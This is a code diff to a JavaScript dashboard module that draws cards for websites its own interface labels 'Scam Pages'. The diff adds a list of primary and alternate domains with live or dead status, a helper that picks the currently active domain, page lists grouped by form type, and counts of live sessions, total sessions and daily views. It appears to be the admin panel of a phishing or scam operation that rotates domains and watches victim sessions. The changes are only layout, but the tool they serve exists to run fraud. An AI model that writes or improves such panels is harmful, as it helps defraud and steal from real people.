@@ -268,12 +268,26 @@ const DemoPagesPage = (() => {
       c.innerHTML=`<div class="dp-sites-empty"><svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="rgba(99,102,241,.28)" stroke-width="1"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg><p style="font-size:15px;font-weight:700;color:var(--text-primary);margin:0;">No Scam Pages yet</p><p style="font-size:12px;color:var(--text-secondary);margin:0;">Click <strong style="color:#a5b4fc;">+ Add Scam Page</strong> to get started</p></div>`;
       return;
     }
+    const allDomains = (w) => {
+      const d = [];
+      if (w.domain) d.push({ domain: w.domain, active: w.domain_active !== 0, primary: true });
+      parseAltDomains(w.domain_alt).forEach(a => d.push({ domain: a.domain, active: !!a.active, primary: false }));
+      return d;
+    };
+    const activeDomain = (w) => {
+      const doms = allDomains(w);
+      const on = doms.find(d => d.active);
+      return on ? on.domain : null;
+    };
     c.innerHTML=`<div class="dp-sites-grid">${S().websites.map((w,i)=>{
       const col=w.color || avatarColor(w.name||String(w.id));
       const [r,g,b]=hexRgb(col);
       const init=(w.name||'?')[0].toUpperCase();
       const validLogo = (w.logo_url && w.logo_url !== 'null' && w.logo_url !== 'undefined') ? w.logo_url.trim() : null;
       const logo = validLogo ? `<img src="${esc(validLogo)}" style="width:100%;height:100%;object-fit:contain;" onerror="this.style.display='none'">` : `<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;color:#fff;background:${col};">${esc(init)}</div>`;
+      const doms = allDomains(w);
+      const liveDom = activeDomain(w);
+      const pageCount = (w.pages && w.pages.length) || 0;
       return `
         <div class="dp-site-card ${w.is_active ? '' : 'dp-site-card--disabled'}" data-site-id="${w.id}" style="--sc-r:${r};--sc-g:${g};--sc-b:${b};animation-delay:${Math.min(i*.07,.42)}s;">
           <div class="dp-site-card-glow"></div>
@@ -282,49 +296,62 @@ const DemoPagesPage = (() => {
             <span class="dp-site-dot ${w.is_active ? 'on' : 'off'}"></span>
             <span>${w.is_active ? 'Active' : 'Disabled'}</span>
           </button>
-          <div style="padding:16px 16px 12px;">
-            <div style="display:flex;align-items:center;gap:12px;margin-bottom:11px;">
-              <div style="width:44px;height:44px;border-radius:11px;overflow:hidden;flex-shrink:0;border:1px solid rgba(255,255,255,.09);">${logo}</div>
+
+          <div style="padding:18px 16px 14px;">
+            <!-- Identity -->
+            <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;">
+              <div style="width:48px;height:48px;border-radius:12px;overflow:hidden;flex-shrink:0;border:1px solid rgba(255,255,255,.09);box-shadow:0 4px 12px rgba(0,0,0,.3);">${logo}</div>
               <div style="flex:1;min-width:0;">
-                <div style="font-size:13px;font-weight:700;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${esc(w.name)}</div>
-                <div style="font-size:10px;color:var(--text-secondary);font-family:var(--font-mono);margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${w.domain_active === 0 ? '🔴' : '🟢'} ${esc(w.domain)}</div>
-                ${parseAltDomains(w.domain_alt).map(a => `<div style="font-size:9px;color:var(--text-tertiary);font-family:var(--font-mono);margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${a.active ? '🟢' : '🔴'} ${esc(a.domain)}</div>`).join('')}
+                <div style="font-size:14px;font-weight:800;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:-.02em;">${esc(w.name)}</div>
+                ${w.demo_slug?`<div style="font-size:10px;color:#818cf8;font-family:var(--font-mono);margin-top:2px;">/demo/${esc(w.demo_slug)}/</div>`:`<div style="font-size:10px;color:#f87171;margin-top:2px;">No slug</div>`}
               </div>
             </div>
-            ${w.demo_slug?`<div class="dp-site-slug">/demo/${esc(w.demo_slug)}/</div>`:`<div class="dp-site-slug dp-site-slug--warn">⚠ No slug set</div>`}
-            
-            ${w.pages && w.pages.length ? `
-              <div style="margin-top:10px;">
-                <div style="font-size:9.5px;font-weight:700;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;">Registered Pages:</div>
-                <div class="dp-site-card-pages" style="display:flex;flex-wrap:wrap;gap:4px;max-height:56px;overflow-y:auto;padding-right:2px;">
+
+            <!-- Domains section -->
+            <div style="background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:8px 10px;margin-bottom:12px;">
+              <div style="font-size:8.5px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--text-muted);margin-bottom:6px;">Domains</div>
+              ${doms.map(d => `
+                <div style="display:flex;align-items:center;gap:6px;padding:3px 0;" title="${esc(d.domain)}">
+                  <span style="width:6px;height:6px;border-radius:50%;flex-shrink:0;background:${d.active ? '#10b981' : '#ef4444'};${d.active ? 'box-shadow:0 0 6px rgba(16,185,129,.5);' : ''}"></span>
+                  <span style="font-size:10px;font-family:var(--font-mono);color:${d.active ? 'var(--text-primary)' : 'var(--text-muted)'};overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;">${esc(d.domain)}</span>
+                  ${d.primary ? '<span style="font-size:8px;padding:1px 5px;background:rgba(99,102,241,.12);color:#818cf8;border-radius:8px;font-weight:700;flex-shrink:0;">PRIMARY</span>' : ''}
+                </div>`).join('')}
+              ${doms.length === 0 ? '<div style="font-size:10px;color:var(--text-muted);font-style:italic;">No domains</div>' : ''}
+            </div>
+
+            <!-- Pages section -->
+            <div style="margin-bottom:12px;">
+              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
+                <span style="font-size:8.5px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--text-muted);">Pages</span>
+                <span style="font-size:10px;font-weight:700;color:${pageCount > 0 ? '#818cf8' : 'var(--text-muted)'};">${pageCount}</span>
+              </div>
+              ${pageCount > 0 ? `
+                <div class="dp-site-card-pages" style="display:flex;flex-wrap:wrap;gap:4px;max-height:52px;overflow-y:auto;">
                   ${w.pages.map(p => {
                     const type = getTypeInfo(p.form_type);
-                    return `
-                      <span class="dp-site-page-pill" data-page-id="${p.id}" data-site-id="${w.id}" title="${esc(p.name)} (${esc(p.url)})" style="--sc-r:${r};--sc-g:${g};--sc-b:${b};">
-                        <span class="dp-page-pill-dot" style="background:${type.color};"></span>
-                        ${esc(p.name)}
-                      </span>`;
+                    return `<span class="dp-site-page-pill" data-page-id="${p.id}" data-site-id="${w.id}" title="${esc(p.name)} (${esc(p.url)})" style="--sc-r:${r};--sc-g:${g};--sc-b:${b};"><span class="dp-page-pill-dot" style="background:${type.color};"></span>${esc(p.name)}</span>`;
                   }).join('')}
-                </div>
-              </div>
-            ` : `
-              <div style="margin-top:10px;font-size:10px;color:var(--text-muted);font-style:italic;">No registered pages</div>
-            `}
+                </div>` : `<div style="font-size:10px;color:var(--text-muted);font-style:italic;">No registered pages</div>`}
+            </div>
 
-            <div style="display:flex;gap:6px;margin-top:10px;">
-              <div class="dp-sc-stat dp-sc-stat--g"><span style="font-size:15px;font-weight:700;">${w.active_sessions||0}</span><span style="font-size:9px;opacity:.65;text-transform:uppercase;letter-spacing:.5px;">Live</span></div>
-              <div class="dp-sc-stat"><span style="font-size:15px;font-weight:700;">${w.total_sessions||0}</span><span style="font-size:9px;opacity:.65;text-transform:uppercase;letter-spacing:.5px;">Total</span></div>
+            <!-- Stats -->
+            <div style="display:flex;gap:6px;">
+              <div class="dp-sc-stat dp-sc-stat--g"><span style="font-size:16px;font-weight:800;">${w.active_sessions||0}</span><span style="font-size:8px;opacity:.65;text-transform:uppercase;letter-spacing:.6px;margin-top:1px;">Live</span></div>
+              <div class="dp-sc-stat"><span style="font-size:16px;font-weight:800;">${w.total_sessions||0}</span><span style="font-size:8px;opacity:.65;text-transform:uppercase;letter-spacing:.6px;margin-top:1px;">Total</span></div>
+              <div class="dp-sc-stat"><span style="font-size:16px;font-weight:800;">${w.page_views_today||0}</span><span style="font-size:8px;opacity:.65;text-transform:uppercase;letter-spacing:.6px;margin-top:1px;">Today</span></div>
             </div>
           </div>
+
+          <!-- Footer -->
           <div class="dp-site-card-foot" style="display:flex;align-items:center;justify-content:space-between;gap:6px;">
             <span style="display:flex;align-items:center;gap:5px;">
               <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
               Open workspace
             </span>
-            ${w.domain ? `
-            <button class="dp-open-domain-btn" data-domain="${esc(w.domain)}" title="Open ${esc(w.domain)}" style="display:flex;align-items:center;gap:4px;padding:3px 8px;border-radius:5px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.06);color:var(--text-secondary);font-size:10px;font-weight:600;cursor:pointer;transition:all .15s;white-space:nowrap;" onmouseenter="this.style.background='rgba(255,255,255,.12)';this.style.color='#f1f5f9'" onmouseleave="this.style.background='rgba(255,255,255,.06)';this.style.color='var(--text-secondary)'">
+            ${liveDom ? `
+            <button class="dp-open-domain-btn" data-domain="${esc(liveDom)}" title="Open ${esc(liveDom)}" style="display:flex;align-items:center;gap:4px;padding:3px 8px;border-radius:6px;border:1px solid rgba(16,185,129,.2);background:rgba(16,185,129,.08);color:#34d399;font-size:10px;font-weight:600;cursor:pointer;transition:all .15s;white-space:nowrap;" onmouseenter="this.style.background='rgba(16,185,129,.18)'" onmouseleave="this.style.background='rgba(16,185,129,.08)'">
               <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-              Domain
+              ${esc(liveDom.length > 22 ? liveDom.slice(0,20) + '..' : liveDom)}
             </button>` : ''}
           </div>
         </div>`;
